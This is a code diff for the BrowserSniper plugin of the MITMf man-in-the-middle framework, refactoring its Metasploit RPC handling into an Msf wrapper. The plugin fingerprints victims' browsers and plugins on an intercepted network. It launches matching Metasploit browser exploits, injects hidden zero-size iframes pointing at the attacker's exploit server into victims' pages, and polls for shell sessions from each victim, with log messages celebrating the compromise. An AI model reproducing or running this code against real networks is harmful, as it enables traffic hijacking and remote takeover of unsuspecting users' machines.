@@ -23,7 +23,7 @@ import random
 import logging
 
 from time import sleep
-from core.msfrpc import Msfrpc
+from core.msfrpc import Msf
 from core.utils import SystemConfig, shutdown
 from plugins.plugin import Plugin
 from plugins.BrowserProfiler import BrowserProfiler
@@ -42,20 +42,11 @@ class BrowserSniper(BrowserProfiler, Plugin):
         self.msfip   = SystemConfig.getIP(options.interface)
         self.sploited_ips = list()  #store ip of pwned or not vulnerable clients so we don't re-exploit
 
-        msfcfg = self.config['MITMf']['Metasploit']
-        self.rpcip   = msfcfg['rpcip']
-        self.rpcpass = msfcfg['rpcpass']
-
         #Initialize the BrowserProfiler plugin
         BrowserProfiler.initialize(self, options)
         
-        try:
-            self.msf = Msfrpc({"host": self.rpcip})  #create an instance of msfrpc libarary
-            self.msf.login('msf', self.rpcpass)
-            version = self.msf.call('core.version')['version']
-            self.tree_info.append("Connected to Metasploit v{}".format(version))
-        except Exception:
-            shutdown("[-] Error connecting to MSF! Make sure you started Metasploit and it's MSGRPC server")
+        msfversion = Msf().version()
+        self.tree_info.append("Connected to Metasploit v{}".format(msfversion))
 
     def startThread(self, options):
         self.snipe()
@@ -84,11 +75,7 @@ class BrowserSniper(BrowserProfiler, Plugin):
         cmd += "set ExitOnSession False\n"
         cmd += "exploit -j\n"
 
-        #Create a virtual console
-        console_id = self.msf.call('console.create')['id']
-
-        #write the cmd to the newly created console
-        self.msf.call('console.write', [console_id, cmd])
+        Msf().sendcommand(cmd)
 
         return (rand_url, rand_port)
 
@@ -140,7 +127,7 @@ class BrowserSniper(BrowserProfiler, Plugin):
 
                     elif details['Plugin'].lower() == 'flash':
                         
-                        if (flash is not None) and (java in details['PluginVersions']):
+                        if (flash is not None) and (flash in details['PluginVersions']):
                             exploits.append(exploit)
 
         mitmf_logger.debug("{} [BrowserSniper] Compatible exploits: {}".format(vic_ip, exploits))
@@ -154,31 +141,23 @@ class BrowserSniper(BrowserProfiler, Plugin):
 
         #The following will poll Metasploit every 2 seconds for new sessions for a maximum of 60 seconds 
         #Will also make sure the shell actually came from the box that we targeted
-        #probably a much cleaner way of doing this :/
         mitmf_logger.info('{} [BrowserSniper] Waiting for ze shellz, sit back and relax...'.format(ip))
-        exit_loop = False
+
         poll_n = 1
-        while poll_n <= 30:
+        msf = Msf()
+        while poll_n != 30:
             
-            if exit_loop is True:
-                break
-            
-            sessions = self.msf.call('session.list')  
-            if sessions:
-                for k, v in sessions.iteritems():
-                    if ip in sessions[k]['tunnel_peer']:
-                        mitmf_logger.info("{} [BrowserSniper] Client haz been 0wn3d! Enjoy!".format(ip))
-                        self.sploited_ips.append(ip)
-                        self.black_ips = self.sploited_ips   #Add to inject blacklist since box has been popped
-                        exit_loop = True
-                        break
-            
+            if msf.sessionsfrompeer(ip):
+                mitmf_logger.info("{} [BrowserSniper] Client haz been 0wn3d! Enjoy!".format(ip))
+                self.sploited_ips.append(ip)
+                self.black_ips = self.sploited_ips   #Add to inject blacklist since box has been popped
+                self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin
+                return
+
             poll_n += 1
             sleep(2) 
 
-        if exit_loop is False:  #We didn't get a shell :(
-            mitmf_logger.info("{} [BrowserSniper] Session not established after 60 seconds".format(ip))
-
+        mitmf_logger.info("{} [BrowserSniper] Session not established after 60 seconds".format(ip))
         self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin
 
     def snipe(self):
@@ -196,26 +175,20 @@ class BrowserSniper(BrowserProfiler, Plugin):
 
                 elif exploits and (vic_ip not in self.sploited_ips):
                     mitmf_logger.info("{} [BrowserSniper] Client vulnerable to {} exploits".format(vic_ip, len(exploits)))
-
                     inject_payload = ''
 
+                    msf = Msf()
                     for exploit in exploits:
 
-                        jobs = self.msf.call('job.list')  #get running jobs
-                        if jobs:
-                            for pid, name in jobs.iteritems():
-                                info = self.msf.call('job.info', [pid])
-                                if (exploit in info['name']):
-                                    mitmf_logger.info('{} [BrowserSniper] {} already started'.format(vic_ip, exploit))
-                                    url = info['uripath']  #get the url assigned to the exploit
-                                    inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, msfport, url)
-                                else:
-                                    url, port = self._setupExploit(exploit, msfport)
-                                    inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, port, url)
+                        pid = msf.findpid(exploit)
+                        if pid:
+                            mitmf_logger.info('{} [BrowserSniper] {} already started'.format(vic_ip, exploit))
+                            url = msf.jobinfo(pid)['uripath']  #get the url assigned to the exploit
+                            inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, msfport, url)
                         else:
                             url, port = self._setupExploit(exploit, msfport)
                             inject_payload += "<iframe src='http://{}:{}{}' height=0%% width=0%%></iframe>".format(self.msfip, port, url)
-                                    
+
                     self.injectAndPoll(vic_ip, inject_payload)
 
             sleep(1)
